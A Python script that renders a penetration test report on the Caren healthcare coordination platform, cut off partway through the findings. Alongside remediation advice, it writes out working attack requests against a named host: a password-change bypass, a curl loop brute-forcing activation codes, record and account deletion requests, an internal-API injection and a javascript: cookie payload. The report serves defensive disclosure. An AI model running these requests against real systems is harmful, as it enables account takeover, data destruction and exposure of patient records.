#!/usr/bin/env python3
"""Generate NullPointer Studio styled PDF pentest report for Caren."""

import json, base64, html as html_mod
from pathlib import Path
from weasyprint import HTML as WeasyprintHTML

BASE_DIR   = Path("/Users/riccardo.tencate/Desktop/agent-smith")
LOGO_PATH  = BASE_DIR / "templates/FullLogo_Transparent.png"
OUTPUT     = BASE_DIR / "report_caren_pentest.pdf"

with open(LOGO_PATH, "rb") as f:
    LOGO_SRC = "data:image/png;base64," + base64.b64encode(f.read()).decode()

# ─── helpers ──────────────────────────────────────────────────────────────────

def esc(s): return html_mod.escape(str(s))

SEV_META = {
    "high":     {"label": "HIGH",     "color": "#ff8c42", "bg": "rgba(255,140,66,0.12)",  "border": "#ff8c42"},
    "medium":   {"label": "MEDIUM",   "color": "#ffd166", "bg": "rgba(255,209,102,0.1)",  "border": "#ffd166"},
    "low":      {"label": "LOW",      "color": "#5bf29b", "bg": "rgba(91,242,155,0.08)",  "border": "#5bf29b"},
    "info":     {"label": "INFO",     "color": "#7b78ff", "bg": "rgba(123,120,255,0.08)", "border": "#7b78ff"},
}

def badge(sev):
    m = SEV_META.get(sev.lower(), SEV_META["info"])
    return (f'<span class="badge" style="background:{m["bg"]};color:{m["color"]};'
            f'border:1px solid {m["color"]};">{m["label"]}</span>')

def code(text):
    return f'<pre class="code-block"><code>{esc(text.strip())}</code></pre>'

def finding_section(np_id, severity, title, owasp, asvs, endpoint, auth, confirmed,
                    description, business_risk, evidence, steps, remediation):
    m = SEV_META.get(severity.lower(), SEV_META["info"])
    return f'''
<div class="finding" style="border-left:4px solid {m["color"]};">
  <div class="finding-header">
    <div class="finding-title-row">
      <span class="finding-id">{esc(np_id)}</span>
      {badge(severity)}
      <span class="finding-title">{esc(title)}</span>
    </div>
    <table class="finding-meta">
      <tr><td>OWASP</td><td>{esc(owasp)}</td><td>ASVS</td><td>{esc(asvs)}</td></tr>
      <tr><td>Endpoint</td><td colspan="3"><code>{esc(endpoint)}</code></td></tr>
      <tr><td>Auth Required</td><td>{esc(auth)}</td><td>Confirmed</td><td>{esc(confirmed)}</td></tr>
    </table>
  </div>
  <div class="finding-body">
    <h4>Description</h4>{description}
    <h4>Business Risk</h4>{business_risk}
    <h4>Evidence</h4>{evidence}
    <h4>Reproduction Steps</h4>{steps}
    <h4>Remediation</h4>{remediation}
  </div>
</div>
'''

# ─── CSS ──────────────────────────────────────────────────────────────────────

CSS_STR = """
@import url('https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600;700&family=Outfit:wght@300;400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap');

:root {
  --bg:        #13112e;
  --bg-card:   #1a1840;
  --bg-raised: #2d2b55;
  --bg-deep:   #0d0b20;
  --text:      #e8e6f0;
  --muted:     #9b98b8;
  --dim:       #6b6890;
  --green:     #5bf29b;
  --purple:    #7b78ff;
  --border:    rgba(123,120,255,0.28);
}

@page {
  size: A4;
  margin: 2.3cm 2.2cm 2cm 2.2cm;
  background: #13112e;
  @bottom-left {
    content: "Caren Penetration Test Report · 2026-05-06";
    font-family: 'IBM Plex Mono', monospace;
    font-size: 7pt;
    color: #6b6890;
  }
  @bottom-right {
    content: "NullPointer Studio · CONFIDENTIAL · Page " counter(page);
    font-family: 'IBM Plex Mono', monospace;
    font-size: 7pt;
    color: #6b6890;
  }
}

@page cover-page { margin: 0; @bottom-left { content: none; } @bottom-right { content: none; } }

html, body {
  background: #13112e;
  color: #e8e6f0;
  font-family: 'Outfit', 'Helvetica Neue', Arial, sans-serif;
  font-size: 9.5pt;
  line-height: 1.65;
}

.cover {
  page: cover-page;
  page-break-after: always;
  background: #0d0b20;
  min-height: 29.7cm;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 3cm 2.5cm;
  text-align: center;
  position: relative;
}
.cover::before {
  content: "";
  position: absolute; top:0; left:0; right:0; height:6px;
  background: linear-gradient(90deg, #5bf29b, #7b78ff, #5bf29b);
}
.cover-logo { height: 180px; margin-bottom: 2.5cm; }
.cover-classification {
  font-family: 'IBM Plex Mono', monospace;
  font-size: 8pt; letter-spacing: 0.2em; color: #ff4d6d;
  border: 1px solid #ff4d6d; padding: 4px 16px; margin-bottom: 1cm; display: inline-block;
}
.cover-title {
  font-family: 'Chakra Petch', monospace; font-size: 28pt; font-weight: 700;
  color: #fff; line-height: 1.15; margin-bottom: 0.4cm;
}
.cover-subtitle {
  font-family: 'Chakra Petch', monospace; font-size: 14pt; font-weight: 400;
  color: #5bf29b; margin-bottom: 1.5cm; letter-spacing: 0.05em;
}
.cover-divider {
  width: 80px; height: 2px;
  background: linear-gradient(90deg, transparent, #7b78ff, transparent);
  margin: 0 auto 1.5cm;
}
.cover-meta {
  width: 100%; max-width: 14cm;
  border-top: 1px solid rgba(123,120,255,0.3); padding-top: 0.8cm; margin-top: 1cm;
}
.cover-meta table { width: 100%; border-collapse: collapse; text-align: left; }
.cover-meta td { padding: 5px 12px; font-size: 9pt; }
.cover-meta td:first-child { color: #9b98b8; font-family: 'IBM Plex Mono', monospace; font-size: 8pt; width: 40%; }
.cover-meta td:last-child { color: #e8e6f0; }
.cover-footer {
  position: absolute; bottom: 1cm;
  font-family: 'IBM Plex Mono', monospace; font-size: 7.5pt; color: #6b6890; letter-spacing: 0.08em;
}

.page-break { page-break-before: always; }

h1 {
  font-family: 'Chakra Petch', monospace; font-size: 18pt; font-weight: 700; color: #fff;
  border-bottom: 2px solid #7b78ff; padding-bottom: 6px; margin: 0 0 18px;
}
h2 { font-family: 'Chakra Petch', monospace; font-size: 13pt; font-weight: 600; color: #5bf29b; margin: 22px 0 10px; }
h3 { font-family: 'Chakra Petch', monospace; font-size: 10.5pt; font-weight: 600; color: #c8c5e8; margin: 16px 0 8px; }
h4 {
  font-family: 'IBM Plex Mono', monospace; font-size: 8.5pt; font-weight: 500;
  color: #7b78ff; text-transform: uppercase; letter-spacing: 0.1em;
  margin: 14px 0 6px; border-left: 2px solid #7b78ff; padding-left: 8px;
}
p { margin: 0 0 8px; }

.section {
  background: #1a1840; border: 1px solid rgba(123,120,255,0.2);
  border-radius: 4px; padding: 20px 22px; margin-bottom: 18px;
}

.dashboard-table, .meta-table, .remediation-table {
  width: 100%; border-collapse: collapse; font-size: 8.5pt; margin: 10px 0;
}
.dashboard-table th, .meta-table th, .remediation-table th {
  background: #2d2b55; color: #7b78ff; font-family: 'IBM Plex Mono', monospace;
  font-size: 7.5pt; text-transform: uppercase; letter-spacing: 0.08em;
  padding: 7px 10px; text-align: left; border-bottom: 1px solid rgba(123,120,255,0.4);
}
.dashboard-table td, .meta-table td, .remediation-table td {
  padding: 6px 10px; border-bottom: 1px solid rgba(123,120,255,0.1); vertical-align: top;
}
.dashboard-table tr:nth-child(even) td,
.remediation-table tr:nth-child(even) td { background: rgba(255,255,255,0.015); }

.finding-meta { width: 100%; border-collapse: collapse; font-size: 8pt; margin-bottom: 14px; }
.finding-meta td { padding: 4px 10px; border: 1px solid rgba(123,120,255,0.15); color: #9b98b8; }
.finding-meta td:first-child, .finding-meta td:nth-child(3) {
  font-family: 'IBM Plex Mono', monospace; font-size: 7pt; color: #7b78ff;
  text-transform: uppercase; letter-spacing: 0.06em; background: rgba(123,120,255,0.06); width: 18%;
}
.finding-meta code { font-family: 'IBM Plex Mono', monospace; font-size: 8pt; color: #5bf29b; background: none; padding: 0; }

.badge {
  font-family: 'IBM Plex Mono', monospace; font-size: 7pt; font-weight: 500;
  padding: 2px 8px; border-radius: 3px; letter-spacing: 0.06em; vertical-align: middle; margin-right: 6px;
}

.finding {
  background: #1a1840; border-left-width: 4px; border-left-style: solid;
  border-top: 1px solid rgba(123,120,255,0.15); border-right: 1px solid rgba(123,120,255,0.15);
  border-bottom: 1px solid rgba(123,120,255,0.15); border-radius: 0 4px 4px 0;
  margin-bottom: 20px; page-break-inside: avoid;
}
.finding-header {
  background: rgba(13,11,32,0.6); padding: 14px 18px 10px;
  border-bottom: 1px solid rgba(123,120,255,0.15);
}
.finding-title-row { display: flex; align-items: center; margin-bottom: 10px; flex-wrap: wrap; gap: 6px; }
.finding-id { font-family: 'IBM Plex Mono', monospace; font-size: 8pt; color: #6b6890; margin-right: 4px; }
.finding-title { font-family: 'Chakra Petch', monospace; font-size: 10pt; font-weight: 600; color: #e8e6f0; }
.finding-body { padding: 14px 18px; }

.code-block {
  background: #0d0b20; border: 1px solid rgba(123,120,255,0.2); border-radius: 3px;
  padding: 10px 14px; font-family: 'IBM Plex Mono', 'Courier New', monospace;
  font-size: 8pt; color: #a8e6c1; white-space: pre-wrap; word-break: break-all; margin: 8px 0;
}
code {
  font-family: 'IBM Plex Mono', 'Courier New', monospace; font-size: 8.5pt;
  color: #5bf29b; background: rgba(91,242,155,0.08); padding: 1px 4px; border-radius: 2px;
}
.callout {
  background: rgba(13,11,32,0.7); border: 1px solid rgba(123,120,255,0.25);
  border-left: 3px solid #7b78ff; border-radius: 0 4px 4px 0;
  padding: 10px 14px; margin: 10px 0; font-size: 8.5pt; color: #9b98b8;
}
.risk-box {
  background: rgba(255,140,66,0.06); border: 1px solid rgba(255,140,66,0.2);
  border-left: 3px solid #ff8c42; border-radius: 0 4px 4px 0;
  padding: 10px 14px; margin: 8px 0; font-size: 8.5pt; color: #e8e6f0;
}

.stat-row { display: flex; gap: 12px; margin: 14px 0; flex-wrap: wrap; }
.stat-box {
  flex: 1; min-width: 70px; background: #0d0b20;
  border: 1px solid rgba(123,120,255,0.2); border-radius: 4px; padding: 10px 14px; text-align: center;
}
.stat-num { font-family: 'Chakra Petch', monospace; font-size: 20pt; font-weight: 700; display: block; line-height: 1.1; }
.stat-label { font-family: 'IBM Plex Mono', monospace; font-size: 6.5pt; color: #6b6890; text-transform: uppercase; letter-spacing: 0.1em; display: block; margin-top: 3px; }

.chain-box {
  background: #0d0b20; border: 1px solid rgba(123,120,255,0.2); border-radius: 4px;
  padding: 14px 18px; margin: 10px 0; font-family: 'IBM Plex Mono', monospace;
  font-size: 8pt; line-height: 1.8; color: #9b98b8;
}
.chain-box .step { color: #5bf29b; }
.chain-box .arrow { color: #7b78ff; }
.chain-box .result { color: #ffd166; }

ul { margin: 4px 0 8px 16px; padding: 0; }
li { margin-bottom: 3px; }
strong { color: #e8e6f0; }
"""

# ─── content sections ─────────────────────────────────────────────────────────

EXEC_SUMMARY = """
<p>NullPointer Studio performed a combined web application penetration test and white-box source
code review of <strong>Caren</strong> (<code>development.caren.nl</code>), a Ruby on Rails 8.1
platform used by Nedap Healthcare to manage care coordination between healthcare professionals,
patients, and their personal networks. Testing was conducted with valid session credentials and
full read access to the application source code.</p>

<p><strong>One high-severity vulnerability was confirmed:</strong> the password change endpoint
does not enforce knowledge of the current password. Rails' <code>has_secure_password</code> only
validates <code>password_challenge</code> when the field is explicitly present in the request.
Omitting it entirely bypasses the check silently. An attacker with any temporary session access
— a stolen cookie, XSS payload, shared workstation — can change the victim's password,
invalidate all sessions, and take over the account. A working proof-of-concept was confirmed live.</p>

<p><strong>Seven medium-severity findings</strong> were confirmed, including absent rate limiting
on the activation code endpoint, account and person record deletion without server-side
safeguards, a Nedap internal API with no application-level authentication, a broken Freshdesk
Basic Auth implementation, a disabled CSRF gate on the WebAuthn registration flow, and acceptance
of unrestricted file types on message attachments.</p>

<p>The application's core RBAC (ActionPolicy), CSRF protection, SQL injection mitigations
(fully parameterized queries), and IDOR controls were found to be solid. No SQL injection and no
cross-user data access were demonstrated. These are meaningful positives for a healthcare platform
processing PHI.</p>

<p><strong>The high-severity finding warrants immediate remediation before the next production
deployment.</strong> Medium findings should be addressed in the current and next sprint.</p>
"""

METHODOLOGY = """
<table class="meta-table">
  <tr><th colspan="2">Engagement Details</th></tr>
  <tr><td>Application</td><td>Caren healthcare coordination platform</td></tr>
  <tr><td>Base URL</td><td><code>https://development.caren.nl</code></td></tr>
  <tr><td>Source code</td><td><code>~/Desktop/caren3</code> — Ruby on Rails 8.1, Ruby 3.4.9</td></tr>
  <tr><td>Auth context</td><td>Valid session: riccardotencate@gmail.com, person_id 617/599</td></tr>
  <tr><td>Database</td><td>PostgreSQL · Session store: Redis</td></tr>
  <tr><td>Test period</td><td>2026-05-06</td></tr>
  <tr><td>Out of scope</td><td>Production database, Freshdesk/Rollbar/AWS S3 internals, social engineering</td></tr>
</table>
<h3>Approach</h3>
<p>The engagement followed a <strong>grey-box</strong> methodology:</p>
<ul>
  <li><strong>Automated reconnaissance</strong> — nmap, httpx, nikto, nuclei, testssl, subfinder</li>
  <li><strong>Authenticated spider</strong> — full crawl of all reachable endpoints with valid session</li>
  <li><strong>White-box code review</strong> — OWASP ASVS 5.0 across all chapters verifiable from source</li>
  <li><strong>Manual endpoint testing</strong> — every endpoint tested against a systematic coverage matrix</li>
  <li><strong>Exploit chain documentation</strong> — confirmed findings linked to realistic attack scenarios</li>
</ul>
<h3>Standards Referenced</h3>
<ul>
  <li>OWASP Top 10 (2021) · OWASP API Security Top 10 (2023)</li>
  <li>OWASP Application Security Verification Standard (ASVS) 5.0</li>
  <li>NIST SP 800-63B — Digital Identity Guidelines</li>
</ul>
"""

ATTACK_CHAIN = """
<p>The most impactful chain uses the password change bypass (NP-001) after gaining temporary
session access — which can be obtained via a shared workstation, XSS on any caren.nl subdomain, or
network-level session interception:</p>
<div class="chain-box">
<span class="step">STEP 1 — Session Acquisition</span>
  Shared workstation, unlocked browser tab, or XSS on any *.caren.nl subdomain
  <span class="arrow">→</span> Attacker holds a valid _caren_session cookie

<span class="step">STEP 2 — Silent Password Change (NP-001)</span>
  PATCH /settings/users/:victim_id/update_password
  Body: user[password]=Attacker1!! &amp; user[password_confirmation]=Attacker1!!
  (user[password_challenge] deliberately omitted — challenge check is skipped)
  <span class="arrow">→</span> HTTP 200 · "Changes saved" · All victim sessions immediately invalidated

<span class="step">STEP 3 — Persistent Authenticated Access</span>
  POST /auth/login with email=victim@example.com password=Attacker1!!
  <span class="arrow">→</span> New persistent session established

<span class="result">OUTCOME — Healthcare Data Exposure</span>
  Full read/write access to patient notes, care plans, calendar, messages (PHI)
  Victim locked out — only recovery via email password reset
  Attacker maintains access indefinitely with no automated detection
</div>
"""

# ─── findings ─────────────────────────────────────────────────────────────────

FINDINGS_HTML = []

# NP-001 — HIGH ───────────────────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-001", "high",
    "Password Change Without Current Password Verification",
    "A07:2021 — Identification and Authentication Failures", "V2.1.5, V2.2.1",
    "PATCH /settings/users/:id/update_password", "Yes (valid session)", "Yes — live PoC confirmed",
    """
<p>The password change endpoint does not enforce knowledge of the current password. Rails'
<code>has_secure_password</code> only validates <code>password_challenge</code> when the field is
<em>explicitly present</em> in the POST body. If the parameter is omitted, the validation is
silently skipped and the update succeeds.</p>
""" + code("""# app/controllers/settings/users_controller.rb
def change_password_params
  params.expect(user: %i[password_challenge password password_confirmation])
  # password_challenge is permitted but not required — omitting it skips the check

# app/models/settings/user_password.rb
def update_and_invalidate_sessions!
  return unless user.update(params)    # params without challenge → no validation
  invalidate_sessions!                 # ALL sessions killed immediately after change
end"""),
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> An attacker with any form of temporary session access can
silently change a care worker's or patient's password, locking them out immediately. This can
disrupt active care delivery, deny access to time-sensitive care plans, and enable persistent
unauthorized reading and modification of patient PHI. Under GDPR/AVG, this constitutes a
data breach requiring regulatory notification within 72 hours if PHI is accessed.
</div>
""",
    code("""# Request WITHOUT password_challenge:
PATCH /settings/users/100000049/update_password HTTP/2
Cookie: _caren_session=<stolen_session>
Content-Type: application/x-www-form-urlencoded
Accept: text/vnd.turbo-stream.html

user[password]=AttackerNewPass123!!!&user[password_confirmation]=AttackerNewPass123!!!

# Response — password changed with no current password required:
HTTP/2 200
<turbo-stream action="replace">...Changes saved...</turbo-stream>"""),
    """
<ol>
  <li>Obtain a valid <code>_caren_session</code> cookie and CSRF token for the target account</li>
  <li>Submit PATCH to <code>/settings/users/:id/update_password</code> with only
      <code>user[password]</code> and <code>user[password_confirmation]</code> — omit
      <code>user[password_challenge]</code> entirely</li>
  <li>Observe HTTP 200 with "Changes saved" — password changed, all victim sessions invalidated</li>
</ol>
""",
    """
<p>Require <code>password_challenge</code> in the controller and add an explicit model guard:</p>
""" + code("""# Controller: use require instead of expect for the challenge field
def change_password_params
  params.require(:user).permit(:password_challenge, :password, :password_confirmation)
end

# Model guard:
def update_and_invalidate_sessions!
  raise ArgumentError, "password_challenge required" if params[:password_challenge].blank?
  return unless user.update(params)
  invalidate_sessions!
end""")
))

# NP-002 — INFO (merged NP-002 + NP-011 + NP-030) ─────────────────────────────
FINDINGS_HTML.append(f'''
<div class="finding" style="border-left:4px solid #7b78ff;">
  <div class="finding-header">
    <div class="finding-title-row">
      <span class="finding-id">NP-002</span>
      {badge("info")}
      <span class="finding-title">Organization Website Field Rendered as Link Without URL Scheme Validation</span>
    </div>
    <table class="finding-meta">
      <tr><td>OWASP</td><td>A03:2021 — Injection</td><td>ASVS</td><td>V1.3.3</td></tr>
      <tr><td>Endpoints</td><td colspan="3"><code>GET /people/:id/links</code> · <code>GET /admin/organizations/:id</code></td></tr>
      <tr><td>Auth Required</td><td>Yes</td><td>Confirmed</td><td>Yes — code review; verified as operator-controlled data</td></tr>
    </table>
  </div>
  <div class="finding-body">
    <h4>Description</h4>
    <p>Two views render the organization <code>website</code> field as an anchor tag href without
    URL scheme validation. Rails' <code>link_to</code> does not sanitize <code>javascript:</code>
    URIs, so if the field contains <code>javascript:alert(document.cookie)</code> a user clicking
    the link would execute that script in their browser context.</p>
    {code("""<%# app/views/people/links/links/nedap_links/_nedap_link.html.erb:46 %>
<li><%= link_to nil, nedap_link.organization.website, rel: "noopener noreferrer", target: "_blank" %></li>

<%# app/views/admin/organizations/show.html.erb:22 — warning suppressed in brakeman.ignore with empty note %>
<dd><%= link_to @organization.website, @organization.website %></dd>""")}
    <p>The <code>website</code> field is populated exclusively from the Nedap internal API
    (<code>POST /api/nedap/organizations/create_or_update</code>), which is network-restricted
    to Nedap's internal infrastructure. End users — patients, care workers, or any external party
    — have no ability to set this value. Only Nedap operators and Nedap's own backend systems write
    to this field.</p>
    <p>Because the data source is operator-controlled (Nedap itself), injecting a
    <code>javascript:</code> URI would require Nedap's own internal systems or operators to be
    compromised. This is outside the threat model for end-user XSS and is considered an
    <strong>intentional design decision</strong> to trust operator-provided data.</p>
    <p>The Brakeman static analysis warning for the admin view was suppressed in
    <code>config/brakeman.ignore</code> with an <strong>empty</strong> <code>note</code> field,
    indicating no documented rationale. The user-facing partial was not flagged by Brakeman,
    leaving it unreviewed by the static analysis pipeline.</p>

    <h4>Business Risk</h4>
    <div class="risk-box">
    <strong>Risk level: low.</strong> Exploitation requires compromise of Nedap's own internal
    API or operator accounts — a scenario where Nedap itself is the attacker. In that threat model,
    much more direct attack paths are available. The finding is documented for completeness and to
    ensure the design decision is explicit rather than accidental.
    </div>

    <h4>Recommendations</h4>
    <ul>
      <li>Add URL scheme validation to the Organization model as defense-in-depth:
      {code("""validates :website, format: {{ with: /\\Ahttps?:\\/\\//, message: "must be http or https" }}, allow_blank: true""")}</li>
      <li>Add a <code>navigate-to https:;</code> CSP directive to block <code>javascript:</code>
          URI navigation at the browser level</li>
      <li>Update the <code>brakeman.ignore</code> entry to include a justification note
          documenting that the data source is operator-controlled:
      {code("""{{ "note": "website field is populated from Nedap internal API only (network-restricted); operator-controlled data, not user-supplied" }}""")}</li>
      <li>Enforce non-empty <code>note</code> fields in <code>brakeman.ignore</code> via CI to
          prevent future undocumented suppressions</li>
    </ul>
  </div>
</div>
''')

# NP-003 — MEDIUM (was HIGH) ──────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-003", "medium",
    "Person Record Permanently Deleted Without Server-Side Confirmation",
    "A01:2021 — Broken Access Control", "—",
    "DELETE /people/:id", "Yes (valid session)", "Yes — person record 599 deleted live",
    """
<p>The Rails <code>destroy</code> action for person records executes without any server-side
confirmation. The UI presents a <code>/people/:id/pre_destroy</code> page with three confirmation
checkboxes, but this is a client-side gate only — the server-side <code>destroy</code> action
performs no validation. A single HTTP request with <code>_method=DELETE</code> and a valid CSRF
token permanently deletes the record and all associated data.</p>
""" + code("""POST /people/599 HTTP/2
Cookie: _caren_session=<valid>
Content-Type: application/x-www-form-urlencoded

_method=DELETE&authenticity_token=<valid_csrf>
# → HTTP 302 redirect; GET /people/599 → HTTP 404"""),
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> Permanent, irreversible destruction of a patient's record,
including their care network, appointments, care plans, notes, and messages. In a healthcare
setting, accidental or malicious deletion of records carries care continuity risk and may violate
data retention obligations under WBGO and GDPR. Any user holding a valid session for an account
that has a relationship to the person can trigger this — not just care administrators.
</div>
""",
    code("""# Live test during assessment:
POST /people/599 with _method=DELETE&authenticity_token=[valid] → HTTP 302 redirect
GET /people/599                                                  → HTTP 404 (permanently gone)

# The pre_destroy form — none of these fields are validated server-side:
<input type="checkbox" name="confirmation[no_more_login]">
<input type="checkbox" name="confirmation[messages]">
<input type="checkbox" name="confirmation[care_providers]">"""),
    """
<ol>
  <li>Authenticate with a valid session for an account with a relationship to the target person</li>
  <li>Extract a CSRF token from any page source</li>
  <li>POST directly to <code>/people/:id</code> with <code>_method=DELETE</code> — no confirmation checkboxes needed</li>
  <li>Record is permanently deleted in a single request</li>
</ol>
""",
    """
<p>Validate the confirmation parameters server-side in the <code>destroy</code> action:</p>
""" + code("""def destroy
  unless %w[no_more_login messages care_providers].all? { |k| params.dig(:confirmation, k) == "1" }
    redirect_to pre_destroy_person_path(@person), alert: "Please confirm all items."
    return
  end
  @person.destroy
  redirect_to people_path
end""")
))

# NP-004 — MEDIUM ─────────────────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-004", "medium",
    "No Rate Limiting on Activation Code Brute-Force",
    "A05:2021 — Security Misconfiguration", "—",
    "POST /people/:id/link_activation/validate", "Yes (valid session)", "Yes — 25 requests, no throttling",
    """
<p>The link activation endpoint accepts unlimited code guesses without rate limiting or lockout.
An attacker who knows a target person's date of birth (required second factor) can enumerate
activation codes at arbitrary speed. 25 consecutive requests with different codes all returned
HTTP 422 with no progressive delay, no 429, and no account lockout.</p>
""",
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> A successful activation code brute-force allows an attacker
to link their account to a patient's care network without authorization. Once linked, the attacker
gains access to care communications, medical notes, calendar, and the ability to participate in
care coordination as a trusted party.
</div>
""",
    code("""for i in $(seq 1 25); do
  curl -sk -o /dev/null -w '%{http_code}\\n' -b '_caren_session=SESSION' \\
    -X POST 'https://development.caren.nl/people/598/link_activation/validate' \\
    -d "link_activation[activation_code]=CODE${i}&link_activation[date_of_birth]=1990-01-01&authenticity_token=CSRF"
done
# Output: 422 422 422 422 422 ... (25 times — no 429, no throttle)"""),
    """<ol>
  <li>Authenticate with a valid session</li>
  <li>Send 25+ POST requests to <code>/people/:id/link_activation/validate</code> with different <code>activation_code</code> values</li>
  <li>Observe all return HTTP 422 with no rate limiting applied</li>
</ol>""",
    code("""# config/initializers/rack_attack.rb
throttle("link_activation/person", limit: 5, period: 15.minutes) do |req|
  if req.path.include?("link_activation/validate") && req.post?
    "#{req.env['rack.session'].id}:#{req.path}"
  end
end""")
))

# NP-006 — MEDIUM ─────────────────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-006", "medium",
    "Account Deletion Without Password Re-Authentication",
    "A07:2021 — Identification and Authentication Failures", "V2.7.1",
    "DELETE /settings/users/:id", "Yes (valid session)", "Yes — code review confirmed",
    """
<p>The account self-deletion flow requires only checkbox confirmations — not password
re-authentication. The pre-destroy form contains no <code>password_challenge</code> field.
An attacker who hijacks a session via XSS, session replay, or physical access to an unlocked
browser can permanently delete the victim's account without knowing their password.</p>
""" + code("""<!-- GET /settings/users/100000194/pre_destroy — no password field present -->
<form action="/settings/users/100000194" method="post">
  <input type="hidden" name="_method" value="delete">
  <input type="checkbox" name="confirmation[no_more_login]" value="1">
  <input type="checkbox" name="confirmation[messages]" value="1">
  <input type="checkbox" name="confirmation[care_providers]" value="1">
</form>"""),
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> Permanent erasure of a care worker's or patient's account,
including all care relationships, care history access, and pending actions. Care continuity
is disrupted with no automated recovery path. Under WBGO, patient-accessible care records must
be maintained for specific retention periods — unauthorized deletion may create legal exposure.
</div>
""",
    code("""DELETE /settings/users/100000194 HTTP/2
Cookie: _caren_session=<stolen>
Body: _method=delete&authenticity_token=<csrf>&confirmation[no_more_login]=1&confirmation[messages]=1&confirmation[care_providers]=1
# → Account permanently deleted, no password required"""),
    """<ol>
  <li>Obtain target user's session cookie (via XSS, physical access, or session replay)</li>
  <li>POST the delete request with all three checkboxes checked, no password challenge</li>
  <li>Account is permanently deleted without any password verification</li>
</ol>""",
    code("""def destroy
  unless current_user.authenticate(params.dig(:user, :password_challenge))
    redirect_to pre_destroy_settings_user_path, alert: "Incorrect password."
    return
  end
  current_user.destroy
end""")
))

# NP-009 — MEDIUM ─────────────────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-009", "medium",
    "Nedap API Lacks Application-Level Authentication",
    "API2:2023 — Broken Authentication", "—",
    "POST /api/nedap/* · GET /api/nedap/*", "No (network-restricted only)", "Yes — code review + live probe",
    """
<p>All controllers under <code>/api/nedap/</code> inherit from <code>Api::ApplicationController</code>
which contains no authentication. The only protection is a network-level IP filter in nginx/HAProxy.
If that perimeter is bypassed (SSRF, compromised internal host, firewall misconfiguration), all
Nedap API operations accept requests without any credential.</p>
""" + code("""# app/controllers/api/application_controller.rb
class ApplicationController < ActionController::Base
  skip_before_action :verify_authenticity_token
  rescue_from ActiveRecord::RecordNotFound { head :not_found }
  # No authentication before_action
end""") + """
<table class="meta-table"><tr><th>Endpoint</th><th>Operation</th></tr>
  <tr><td><code>POST /api/nedap/organizations/create_or_update</code></td><td>Create/update organization records including website field</td></tr>
  <tr><td><code>POST /api/nedap/bulk_messages/create_or_update</code></td><td>Send bulk messages to all patients in an organization</td></tr>
  <tr><td><code>POST /api/nedap/minddistrict_configs/create_or_update</code></td><td>Modify MindDistrict SSO configuration</td></tr>
  <tr><td><code>GET /api/nedap/calendar_occurrences</code></td><td>Read patient appointment data</td></tr>
</table>
""",
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> If the network perimeter is breached, an attacker gains
unauthenticated access to operations affecting all patients across all organizations: bulk
messaging allows impersonating Nedap to send fraudulent care instructions to patients; calendar
access exposes appointment PII for all users; organization updates could inject malicious data
into care records. The blast radius is platform-wide, not scoped to a single user or organization.
</div>
""",
    code("""# From inside internal network or via SSRF:
curl -X POST https://development.caren.nl/api/nedap/organizations/create_or_update \\
  -H "Content-Type: application/json" \\
  -d '{"organization": {"id": 1, "website": "https://malicious.example.com"}}'
# HTTP 200 — no application-layer credential required

# From public internet (blocked at nginx):
curl -X POST https://development.caren.nl/api/nedap/organizations/create_or_update
# HTTP 403 — network filter blocks; Rails never receives the request"""),
    """<ol>
  <li>Gain internal network access (via SSRF from the application, or a compromised internal host)</li>
  <li>POST to any <code>/api/nedap/</code> endpoint without credentials</li>
  <li>Application processes the request with no authentication check</li>
</ol>""",
    code("""# Add a shared-secret token check to Api::ApplicationController:
before_action :verify_internal_token

def verify_internal_token
  expected = Rails.application.credentials.nedap_api_secret
  provided = request.headers["X-Nedap-Api-Token"]
  head :unauthorized unless ActiveSupport::SecurityUtils.secure_compare(expected.to_s, provided.to_s)
end""")
))

# NP-010 — MEDIUM ─────────────────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-010", "medium",
    "Freshdesk Sync Endpoint Ignores Password in Basic Auth",
    "A07:2021 — Identification and Authentication Failures", "—",
    "PUT /api/freshdesk/contact_details/sync", "Basic Auth (username only)", "Yes — code review confirmed",
    """
<p>The Freshdesk contact sync webhook performs HTTP Basic Auth but only validates the username
component against <code>FRESHDESK_CAREN_API_KEY</code>. The password field is silently discarded:</p>
""" + code("""# app/controllers/api/freshdesk/contact_details_controller.rb
def basic_auth_valid?(expected)
  decoded = Base64.decode64(auth_header.split(" ", 2).last)
  username, _password = decoded.split(":", 2)   # _password discarded
  secure_compare(username, expected)             # only username checked
end""") + """
<p>Any client providing the API key as the Basic Auth username — with <em>any</em> password —
authenticates successfully. The endpoint is currently guarded by a <code>production_or_local?</code>
check that restricts it to production environments, limiting exploitability from the development
environment tested.</p>
""",
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> On production, an attacker who obtains the API key value
(via source code exposure, configuration leak, or logging) can trigger unauthorized Freshdesk
contact synchronization, potentially overwriting patient contact information in the helpdesk
system or triggering unintended support ticket workflows tied to patient data.
</div>
""",
    code("""# Exploit on production (API key known):
Authorization: Basic <base64("KNOWN_API_KEY:anything_goes_here")>
PUT /api/freshdesk/contact_details/sync
→ HTTP 200 — authenticated with arbitrary password"""),
    """<ol>
  <li>Discover the <code>FRESHDESK_CAREN_API_KEY</code> value (via source leak or config exposure)</li>
  <li>Base64 encode <code>&lt;API_KEY&gt;:arbitrary_value</code></li>
  <li>Send PUT to <code>/api/freshdesk/contact_details/sync</code> with that Authorization header</li>
  <li>On production: authenticated and executed. On development: blocked by environment guard.</li>
</ol>""",
    code("""def basic_auth_valid?(expected_key)
  decoded = Base64.decode64(auth_header.split(" ", 2).last)
  _username, password = decoded.split(":", 2)
  # Validate password as the token (standard Freshdesk webhook pattern)
  ActiveSupport::SecurityUtils.secure_compare(password.to_s, expected_key.to_s)
end""")
))

# NP-012 — MEDIUM ─────────────────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-012", "medium",
    "Trusted Device Controller — CSRF Disabled, User-Agent Guard Spoofable",
